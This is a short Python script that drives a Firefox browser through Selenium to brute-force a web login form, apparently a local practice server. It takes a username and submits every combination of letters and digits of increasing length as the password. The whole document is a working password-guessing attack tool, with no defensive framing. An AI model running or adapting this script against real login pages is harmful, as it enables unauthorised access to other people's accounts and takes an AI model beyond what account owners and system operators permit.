from itertools import product
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
import time

global username
username = input('Username: ')

driver = webdriver.Firefox()
driver.get("https://127.0.0.1:5000/login")

def crack(length):
    global username
    for items in product('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789',repeat=length):
        password = ''.join(items)
        elem = driver.find_element(By.NAME, "username")
        elem.clear()
        elem.send_keys(username)
        elem = driver.find_element(By.NAME, "password")
        elem.clear()
        elem.send_keys(password)
        elem.send_keys(Keys.RETURN)
        print(password)
        time.sleep(1)

x=1
while True:
    crack(x)
    x+=1